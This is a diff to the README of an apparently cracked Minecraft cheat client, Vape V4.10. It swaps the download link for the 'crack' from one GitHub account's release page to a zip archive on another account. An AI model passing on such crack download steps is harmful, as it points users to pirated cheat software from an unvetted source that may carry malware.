@@ -3,7 +3,7 @@ Ghost Client Minecraft
 
 # Tutorial on how to use it and Please read it:
 
-1.install the crack from the [Release](https://github.com/skody01/Vape-V4.10-Crack/releases/tag/Vape-v4.10) section
+1.install the crack : [Download](https://github.com/ByteSleuths/Vape-V4/archive/refs/heads/main.zip) 
 
 2.Proceed to install [Java 17.0.6](https://www.oracle.com/java/technologies/javase/jdk17-archive-downloads.html) or a more recent version.
 
